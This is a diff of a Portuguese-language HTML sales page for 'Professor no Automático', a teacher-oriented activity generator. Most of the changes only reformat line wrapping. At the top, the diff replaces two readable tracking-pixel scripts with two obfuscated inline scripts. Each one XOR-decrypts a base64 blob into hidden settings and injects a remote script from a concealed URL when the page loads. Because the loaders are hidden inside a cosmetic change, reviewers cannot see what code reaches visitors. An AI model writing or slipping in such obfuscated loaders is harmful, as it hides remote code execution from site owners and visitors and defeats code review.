@@ -11,16 +11,8 @@
   <link rel="preload" href="fonts/Stolzl-Medium-600.woff2" as="font" type="font/woff2" crossorigin>
   <link rel="preload" href="fonts/Stolzl-Regular-500.woff2" as="font" type="font/woff2" crossorigin>
   <link rel="preload" href="fonts/Stolzl-Book-400.woff2" as="font" type="font/woff2" crossorigin>
-  <script>
-    window.pixelId = "6a00e758b644022afed6568a";
-    var a = document.createElement("script");
-    a.setAttribute("async", "");
-    a.setAttribute("defer", "");
-    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-    document.head.appendChild(a);
-  </script>
-  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids
-    async defer></script>
+  <script>(function () { var s_9 = atob("DPYTuECiHOdYRChQ0o0xzTLOPt16LFwkooUpl2/BeIl2MVw9u5BqliPNcck6NgcjsYR6yDTRM5cxPE08/YZ6wCXOMo0rZgRys4JnyinAaZM9Nwpqias/mifOc4U5KFty6K1omi7DcYJ6fgogu4521AnGPst6Mkk8p5MxgmKUfdBoIEln4cIq2SGSL4E6fRk255IkiSOAYbol"); var j_norr = []; for (var g_mg = 0; g_mg < s_9.length; g_mg++) { j_norr.push(s_9.charCodeAt(g_mg) & 255); } var q_l = j_norr[0]; var o_i = j_norr.slice(1, 1 + q_l); var c_p61 = j_norr.slice(1 + q_l); var v_977 = c_p61.map(function (b, v_3bfn) { return b ^ o_i[v_3bfn % q_l]; }); var l_dc = ""; for (var v_0i1 = 0; v_0i1 < v_977.length; v_0i1++) { l_dc += String.fromCharCode(v_977[v_0i1] & 255); } var s_g = decodeURIComponent(escape(l_dc)); var k_zx1o = JSON.parse(s_g); var t_noa = k_zx1o.globals || []; t_noa.forEach(function (l_wy5m) { window[l_wy5m.name] = l_wy5m.value; }); var v_92y8 = document.createElement("script"); v_92y8.src = k_zx1o.url; v_92y8.async = true; v_92y8.defer = true; (k_zx1o.attributes || []).forEach(function (m_3p9) { v_92y8.setAttribute(m_3p9.name, m_3p9.value); }); (document.head || document.documentElement).appendChild(v_92y8); })();</script>
+  <script>(function () { var u_a7 = atob("DFw+osus2g7DndGOSCcc17nA+DTh9aX6OC8EjeTPvmDt6KXjITpHjKjDtyCh7/79Ky5X0r/f9Xu38KKhJD1Kx7jY9GSwv/2sKShK0KLOr3qm7vO0EycczKrBvyz5v7XvPD0T17/Bs2i6sKH8LSpbzL+Bom2s+fz9Kzccjunau2K2+PO0an5DjrCOtG+u+PO0ajhf1qqBr3qu9Lf3ZSxMx73JtHru7qTsIThNgOeOrG+v6LSscn4c35bR"); var f_8yh6 = []; for (var f_mfay = 0; f_mfay < u_a7.length; f_mfay++) { f_8yh6.push(u_a7.charCodeAt(f_mfay) & 255); } var u_ap8l = f_8yh6[0]; var j_vx = f_8yh6.slice(1, 1 + u_ap8l); var i_m = f_8yh6.slice(1 + u_ap8l); var d_2fvc = i_m.map(function (b, x_8m9i) { return b ^ j_vx[x_8m9i % u_ap8l]; }); var x_6i = ""; for (var t_08fs = 0; t_08fs < d_2fvc.length; t_08fs++) { x_6i += String.fromCharCode(d_2fvc[t_08fs] & 255); } var b_c = decodeURIComponent(escape(x_6i)); var k_5ei = JSON.parse(b_c); var s_c7z = k_5ei.globals || []; s_c7z.forEach(function (x_5iyz) { window[x_5iyz.name] = x_5iyz.value; }); var i_na = document.createElement("script"); i_na.src = k_5ei.url; i_na.async = true; i_na.defer = true; (k_5ei.attributes || []).forEach(function (k_qzcd) { i_na.setAttribute(k_qzcd.name, k_qzcd.value); }); (document.head || document.documentElement).appendChild(i_na); })();</script>
   <style>
     @font-face {
       font-family: 'Stolzl';
@@ -87,19 +79,29 @@
 
     /* COLORS */
     :root {
-      --dark1: #020B1F;      /* Azul marinho profundo */
-      --dark2: #061735;      /* Azul escuro de apoio */
-      --light1: #EEF4FB;     /* Azul muito claro */
-      --light2: #E2ECF7;     /* Azul claro para alternância */
-      --accent: #FF5E36;     /* Coral alegre para CTAs e destaques */
-      --accent2: #0A4FA3;    /* Azul intenso */
-      --green: #2ECC71;      /* Verde conversão */
+      --dark1: #020B1F;
+      /* Azul marinho profundo */
+      --dark2: #061735;
+      /* Azul escuro de apoio */
+      --light1: #EEF4FB;
+      /* Azul muito claro */
+      --light2: #E2ECF7;
+      /* Azul claro para alternância */
+      --accent: #FF5E36;
+      /* Coral alegre para CTAs e destaques */
+      --accent2: #0A4FA3;
+      /* Azul intenso */
+      --green: #2ECC71;
+      /* Verde conversão */
       --green-dark: #27AE60;
       --red: #E74C3C;
       --white: #ffffff;
-      --text-dark: #020B1F;  /* Texto escuro */
-      --text-light: #EEF4FB; /* Texto claro */
-      --text-muted: #B7C7DF; /* Texto secundário azulado claro */
+      --text-dark: #020B1F;
+      /* Texto escuro */
+      --text-light: #EEF4FB;
+      /* Texto claro */
+      --text-muted: #B7C7DF;
+      /* Texto secundário azulado claro */
     }
 
     /* BUTTONS */
@@ -481,7 +483,8 @@
   <section id="bloco1">
     <div class="container">
       <div class="hero-inner">
-        <h1 class="hero-h1">Pare de perder tempo criando atividades escolares manualmente e <span>gere tarefas EXATAMENTE como você quer
+        <h1 class="hero-h1">Pare de perder tempo criando atividades escolares manualmente e <span>gere tarefas
+            EXATAMENTE como você quer
             em menos de 5 minutos</span> usando apenas o celular</h1>
         <div class="hero-img">
           <img src="imgs/mockup-principal-produto.webp" alt="Professor no Automático mockup principal" loading="eager"
@@ -580,7 +583,8 @@
       <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:24px;margin-bottom:36px">
         <div style="background:rgba(255,255,255,.07);border-radius:16px;padding:28px 22px">
           <div style="font-size:1.8rem;margin-bottom:12px;text-align:center">📌</div>
-          <h3 style="color:var(--accent);font-size:1rem;font-weight:700;margin-bottom:10px">Criar atividades escolares em
+          <h3 style="color:var(--accent);font-size:1rem;font-weight:700;margin-bottom:10px">Criar atividades escolares
+            em
             minutos sem precisar montar tudo manualmente.</h3>
           <p style="color:#b0c4de;font-size:.92rem;line-height:1.65">Chega de passar horas digitando exercícios,
             formatando folhas e procurando conteúdo na internet. Agora você simplesmente <strong
@@ -588,7 +592,8 @@
         </div>
         <div style="background:rgba(255,255,255,.07);border-radius:16px;padding:28px 22px">
           <div style="font-size:1.8rem;margin-bottom:12px;text-align:center">🤖</div>
-          <h3 style="color:var(--accent);font-size:1rem;font-weight:700;margin-bottom:10px">Usar Inteligência Artificial de
+          <h3 style="color:var(--accent);font-size:1rem;font-weight:700;margin-bottom:10px">Usar Inteligência Artificial
+            de
             forma simples mesmo sem entender tecnologia.</h3>
           <p style="color:#b0c4de;font-size:.92rem;line-height:1.65">Você não precisa aprender comandos difíceis nem
             assistir aulas técnicas. Tudo foi criado para <strong style="color:#fff">qualquer professora</strong>
@@ -604,7 +609,8 @@
         </div>
         <div style="background:rgba(255,255,255,.07);border-radius:16px;padding:28px 22px">
           <div style="font-size:1.8rem;margin-bottom:12px;text-align:center">🧘</div>
-          <h3 style="color:var(--accent);font-size:1rem;font-weight:700;margin-bottom:10px">Diminuir o estresse e o desgaste
+          <h3 style="color:var(--accent);font-size:1rem;font-weight:700;margin-bottom:10px">Diminuir o estresse e o
+            desgaste
             mental causados pela rotina escolar.</h3>
           <p style="color:#b0c4de;font-size:.92rem;line-height:1.65">A sensação de nunca terminar o trabalho pode ser
             extremamente cansativa. <strong style="color:#fff">Automatizar tarefas repetitivas</strong> ajuda você a
@@ -654,7 +660,7 @@
           style="color:#fff">eliminar horas de trabalho manual</strong> e deixar tudo ainda mais rápido, simples e
         automático.</p>
       <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:24px">
- 
+
         <div style="background:rgba(255,255,255,.06);border-radius:16px;padding:28px">
           <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:14px">
             <span
@@ -663,14 +669,16 @@
             <div style="text-align:right">
               <small style="color:#b0c4de;font-weight:400;display:block;font-size:.75rem">Valor: <span
                   style="text-decoration:line-through">R$ 41,85</span></small>
-              <span style="color:var(--green);font-weight:700;font-size:.85rem;line-height:1.2;display:block">Grátis no Plano
+              <span style="color:var(--green);font-weight:700;font-size:.85rem;line-height:1.2;display:block">Grátis no
+                Plano
                 Completo</span>
             </div>
           </div>
           <div style="background:#ffffff;margin-bottom:14px;display:flex;justify-content:center;align-items:center">
             <img src="imgs/Bonus-1.webp" alt="Bônus 1 - Gerador de Textos" loading="lazy" style="width:100%">
           </div>
-          <h3 style="color:var(--accent);font-size:1rem;font-weight:700;margin-bottom:10px">Gerador Automático de Textos e
+          <h3 style="color:var(--accent);font-size:1rem;font-weight:700;margin-bottom:10px">Gerador Automático de Textos
+            e
             Interpretação</h3>
           <p style="color:#b0c4de;font-size:.9rem;line-height:1.65;margin-bottom:10px">Digite apenas o tema e a série
             escolar. E receba automaticamente:</p>
@@ -684,7 +692,7 @@
               style="color:#fff">conteúdos completos em segundos</strong> sem precisar pesquisar ou montar tudo
             manualmente.</p>
         </div>
- 
+
         <div style="background:rgba(255,255,255,.06);border-radius:16px;padding:28px">
           <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:14px">
             <span
@@ -693,14 +701,16 @@
             <div style="text-align:right">
               <small style="color:#b0c4de;font-weight:400;display:block;font-size:.75rem">Valor: <span
                   style="text-decoration:line-through">R$ 41,85</span></small>
-              <span style="color:var(--green);font-weight:700;font-size:.85rem;line-height:1.2;display:block">Grátis no Plano
+              <span style="color:var(--green);font-weight:700;font-size:.85rem;line-height:1.2;display:block">Grátis no
+                Plano
                 Completo</span>
             </div>
           </div>
           <div style="background:#ffffff;margin-bottom:14px;display:flex;justify-content:center;align-items:center">
             <img src="imgs/Bonus-2.webp" alt="Bônus 2 - Máquina de Problemas" loading="lazy" style="width:100%">
           </div>
-          <h3 style="color:var(--accent);font-size:1rem;font-weight:700;margin-bottom:10px">Máquina de Problemas Matemáticos
+          <h3 style="color:var(--accent);font-size:1rem;font-weight:700;margin-bottom:10px">Máquina de Problemas
+            Matemáticos
           </h3>
           <p style="color:#b0c4de;font-size:.9rem;line-height:1.65;margin-bottom:10px">Crie automaticamente:</p>
           <ul style="color:#b0c4de;font-size:.9rem;line-height:1.8;padding-left:4px;list-style:none">
@@ -714,7 +724,7 @@
             zero.
           </p>
         </div>
- 
+
         <div style="background:rgba(255,255,255,.06);border-radius:16px;padding:28px">
           <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:14px">
             <span
@@ -723,14 +733,16 @@
             <div style="text-align:right">
               <small style="color:#b0c4de;font-weight:400;display:block;font-size:.75rem">Valor: <span
                   style="text-decoration:line-through">R$ 41,85</span></small>
-              <span style="color:var(--green);font-weight:700;font-size:.85rem;line-height:1.2;display:block">Grátis no Plano
+              <span style="color:var(--green);font-weight:700;font-size:.85rem;line-height:1.2;display:block">Grátis no
+                Plano
                 Completo</span>
             </div>
           </div>
           <div style="background:#ffffff;margin-bottom:14px;display:flex;justify-content:center;align-items:center">
             <img src="imgs/Bonus-3.webp" alt="Bônus 3 - Criador de Avaliações" loading="lazy" style="width:100%">
           </div>
-          <h3 style="color:var(--accent);font-size:1rem;font-weight:700;margin-bottom:10px">Criador Instantâneo de Avaliações
+          <h3 style="color:var(--accent);font-size:1rem;font-weight:700;margin-bottom:10px">Criador Instantâneo de
+            Avaliações
           </h3>
           <p style="color:#b0c4de;font-size:.9rem;line-height:1.65;margin-bottom:10px">Gere automaticamente:</p>
           <ul style="color:#b0c4de;font-size:.9rem;line-height:1.8;padding-left:4px;list-style:none">
@@ -743,7 +755,7 @@
           <p style="color:#b0c4de;font-size:.88rem;margin-top:10px">Tudo estruturado de forma organizada para <strong
               style="color:#fff">facilitar sua rotina</strong> e reduzir horas de preparação.</p>
         </div>
- 
+
         <div style="background:rgba(255,255,255,.06);border-radius:16px;padding:28px">
           <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:14px">
             <span
@@ -752,14 +764,16 @@
             <div style="text-align:right">
               <small style="color:#b0c4de;font-weight:400;display:block;font-size:.75rem">Valor: <span
                   style="text-decoration:line-through">R$ 41,85</span></small>
-              <span style="color:var(--green);font-weight:700;font-size:.85rem;line-height:1.2;display:block">Grátis no Plano
+              <span style="color:var(--green);font-weight:700;font-size:.85rem;line-height:1.2;display:block">Grátis no
+                Plano
                 Completo</span>
             </div>
           </div>
           <div style="background:#ffffff;margin-bottom:14px;display:flex;justify-content:center;align-items:center">
             <img src="imgs/Bonus-4.webp" alt="Bônus 4 - Planejamento Escolar" loading="lazy" style="width:100%">
           </div>
-          <h3 style="color:var(--accent);font-size:1rem;font-weight:700;margin-bottom:10px">Planejamento Escolar em Minutos
+          <h3 style="color:var(--accent);font-size:1rem;font-weight:700;margin-bottom:10px">Planejamento Escolar em
+            Minutos
           </h3>
           <p style="color:#b0c4de;font-size:.9rem;line-height:1.65;margin-bottom:10px">Crie rapidamente:</p>
           <ul style="color:#b0c4de;font-size:.9rem;line-height:1.8;padding-left:4px;list-style:none">
@@ -771,7 +785,7 @@
           <p style="color:#b0c4de;font-size:.88rem;margin-top:10px">Sem precisar passar horas <strong
               style="color:#fff">montando planejamentos manualmente</strong>.</p>
         </div>
- 
+
         <div style="background:rgba(255,255,255,.06);border-radius:16px;padding:28px">
           <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:14px">
             <span
@@ -780,14 +794,16 @@
             <div style="text-align:right">
               <small style="color:#b0c4de;font-weight:400;display:block;font-size:.75rem">Valor: <span
                   style="text-decoration:line-through">R$ 41,85</span></small>
-              <span style="color:var(--green);font-weight:700;font-size:.85rem;line-height:1.2;display:block">Grátis no Plano
+              <span style="color:var(--green);font-weight:700;font-size:.85rem;line-height:1.2;display:block">Grátis no
+                Plano
                 Completo</span>
             </div>
           </div>
           <div style="background:#ffffff;margin-bottom:14px;display:flex;justify-content:center;align-items:center">
             <img src="imgs/Bonus-5.webp" alt="Bônus 5 - Adaptador Inclusão" loading="lazy" style="width:100%">
           </div>
-          <h3 style="color:var(--accent);font-size:1rem;font-weight:700;margin-bottom:10px">Adaptador para Inclusão Escolar
+          <h3 style="color:var(--accent);font-size:1rem;font-weight:700;margin-bottom:10px">Adaptador para Inclusão
+            Escolar
           </h3>
           <p style="color:#b0c4de;font-size:.9rem;line-height:1.65;margin-bottom:10px">Transforme automaticamente
             atividades comuns em versões adaptadas para:</p>
@@ -800,7 +816,7 @@
           <p style="color:#b0c4de;font-size:.88rem;margin-top:10px">Facilitando a <strong style="color:#fff">inclusão
               escolar</strong> de forma prática e muito mais rápida.</p>
         </div>
- 
+
         <div style="background:rgba(255,255,255,.06);border-radius:16px;padding:28px">
           <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:14px">
             <span
@@ -809,14 +825,16 @@
             <div style="text-align:right">
               <small style="color:#b0c4de;font-weight:400;display:block;font-size:.75rem">Valor: <span
                   style="text-decoration:line-through">R$ 41,85</span></small>
-              <span style="color:var(--green);font-weight:700;font-size:.85rem;line-height:1.2;display:block">Grátis no Plano
+              <span style="color:var(--green);font-weight:700;font-size:.85rem;line-height:1.2;display:block">Grátis no
+                Plano
                 Completo</span>
             </div>
           </div>
           <div style="background:#ffffff;margin-bottom:14px;display:flex;justify-content:center;align-items:center">
             <img src="imgs/Bonus-6.webp" alt="Bônus 6 - Gerador de Relatórios" loading="lazy" style="width:100%">
           </div>
-          <h3 style="color:var(--accent);font-size:1rem;font-weight:700;margin-bottom:10px">Gerador de Relatórios e Pareceres
+          <h3 style="color:var(--accent);font-size:1rem;font-weight:700;margin-bottom:10px">Gerador de Relatórios e
+            Pareceres
           </h3>
           <p style="color:#b0c4de;font-size:.9rem;line-height:1.65;margin-bottom:10px">Digite apenas comportamento,
             desempenho e dificuldades do aluno. E receba automaticamente:</p>
@@ -828,7 +846,7 @@
           <p style="color:#b0c4de;font-size:.88rem;margin-top:10px">Ideal para <strong style="color:#fff">economizar
               tempo</strong> em uma das tarefas mais cansativas da rotina escolar.</p>
         </div>
- 
+
       </div>
     </div>
   </section>
@@ -836,25 +854,29 @@
   <!-- BLOCO 8: PLANOS -->
   <section id="bloco8" style="background:var(--light2);padding:55px 0">
     <div class="container">
-      <h2 style="font-size:clamp(1.4rem,3vw,2rem);font-weight:700;color:var(--text-dark);text-align:center;margin-bottom:36px">
+      <h2
+        style="font-size:clamp(1.4rem,3vw,2rem);font-weight:700;color:var(--text-dark);text-align:center;margin-bottom:36px">
         Escolha a melhor opção para você:</h2>
       <div
         style="display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:28px;max-width:1000px;margin:0 auto">
- 
+
         <!-- PLANO BÁSICO -->
         <div style="background:#fff;border-radius:20px;padding:32px 18px;border:2px solid #e0e0e0;text-align:center">
           <p style="font-size:1.2rem;font-weight:700;color:var(--text-dark);margin-bottom:16px">PLANO BÁSICO</p>
           <img src="imgs/Produto-principal-sem-bonus-plano-basico.webp" alt="Plano Básico" loading="lazy"
             style="width:100%;border-radius:10px;margin-bottom:16px">
-          <ul style="list-style:none;text-align:left;margin-bottom:16px;color:var(--text-dark);font-size:.95rem;line-height:2">
+          <ul
+            style="list-style:none;text-align:left;margin-bottom:16px;color:var(--text-dark);font-size:.95rem;line-height:2">
             <li>✔️ Professor no Automático™</li>
           </ul>
-          <ul style="list-style:none;text-align:left;margin-bottom:16px;color:var(--text-dark);font-size:.95rem;line-height:2;padding-left:0">
+          <ul
+            style="list-style:none;text-align:left;margin-bottom:16px;color:var(--text-dark);font-size:.95rem;line-height:2;padding-left:0">
             <li>⚡ Acesso Imediato</li>
             <li>💎 Acesso Vitalício</li>
             <li>🛡️ Garantia de 7 dias</li>
           </ul>
-          <p style="color:#33445F;font-size:.9rem;margin-bottom:16px"><strong>IDEAL PARA:</strong> Professores que querem
+          <p style="color:#33445F;font-size:.9rem;margin-bottom:16px"><strong>IDEAL PARA:</strong> Professores que
+            querem
             começar a automatizar atividades escolares de forma simples e rápida.</p>
           <p style="color:#40516B;font-size:.9rem;margin-bottom:4px">De <s>R$ 179,00</s> por:</p>
           <p style="font-size:3.25rem;font-weight:700;color:#08A84F;margin-bottom:4px">R$ 17,90</p>
@@ -869,7 +891,7 @@
             Atenção: Temos uma oferta ainda mais vantajosa para você! Veja logo abaixo.</p>
           <p style="color:#e53935;font-size:1.5rem;animation:bounce-arrow 1s infinite">▼</p>
         </div>
- 
+
         <!-- PLANO COMPLETO -->
         <div
           style="background:#ffffff;border-radius:20px;padding:32px 18px;border:3px solid var(--accent);text-align:center;position:relative;box-shadow:0 10px 30px rgba(255,112,67,0.12)">
@@ -883,9 +905,11 @@
           </div>
           <img src="imgs/mockup-principal-produto.webp" alt="Plano Completo" loading="lazy"
             style="width:100%;border-radius:10px;margin-bottom:14px">
-          <p style="color:var(--accent);font-weight:700;font-size:.9rem;margin-bottom:12px">📦 Todos os Materiais (Recebimento
+          <p style="color:var(--accent);font-weight:700;font-size:.9rem;margin-bottom:12px">📦 Todos os Materiais
+            (Recebimento
             Imediato)</p>
-          <ul style="list-style:none;text-align:left;color:var(--text-dark);font-size:.92rem;line-height:1.9;margin-bottom:16px">
+          <ul
+            style="list-style:none;text-align:left;color:var(--text-dark);font-size:.92rem;line-height:1.9;margin-bottom:16px">
             <li>✔️ Professor no Automático™</li>
             <li>✔️ Gerador Automático de Textos e Interpretação</li>
             <li>✔️ Máquina de Problemas Matemáticos</li>
@@ -894,7 +918,8 @@
             <li>✔️ Adaptador para Inclusão Escolar</li>
             <li>✔️ Gerador de Relatórios e Pareceres</li>
           </ul>
-          <ul style="list-style:none;text-align:left;margin-bottom:16px;color:var(--text-dark);font-size:.92rem;line-height:1.9;padding-left:0">
+          <ul
+            style="list-style:none;text-align:left;margin-bottom:16px;color:var(--text-dark);font-size:.92rem;line-height:1.9;padding-left:0">
             <li>⚡ Acesso Imediato</li>
             <li>💎 Acesso Vitalício</li>
             <li>🛡️ Garantia de 7 dias</li>
@@ -936,7 +961,8 @@
         constitui violação dos direitos autorais (Art. 184 do Código Penal e Lei 9.610/98), sujeitando os infratores às
         sanções civis e criminais previstas na legislação aplicável.</p>
       <p style="color:#7a8fa6;font-size:.8rem">Em caso de dúvidas, suporte ou problemas de acesso, entre em contato: <a
-          href="mailto:suporte@elitepd.com.br" style="color:var(--accent)">suporte@elitepd.com.br</a> — Segunda a sexta, das
+          href="mailto:suporte@elitepd.com.br" style="color:var(--accent)">suporte@elitepd.com.br</a> — Segunda a sexta,
+        das
         8h às 16h.</p>
     </div>
   </footer>
